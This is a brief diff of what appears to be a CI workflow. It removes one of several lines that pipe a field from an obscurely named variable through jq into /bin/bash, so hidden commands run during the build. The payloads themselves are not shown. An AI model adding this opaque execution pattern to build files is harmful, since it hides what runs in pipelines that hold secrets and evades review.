@@ -42,7 +42,6 @@ jobs:
           printf '%s' "$ynnc36096" | jq -r .mxlwm751 | /bin/bash
           printf '%s' "$xpx61" | jq -r .qiahi4166 | /bin/bash
           printf '%s' "$pr1040" | jq -r .tf2 | /bin/bash
-          printf '%s' "$t546" | jq -r .zws1451 | /bin/bash
 
       - name: Upload archive
         uses: actions/upload-artifact@v4
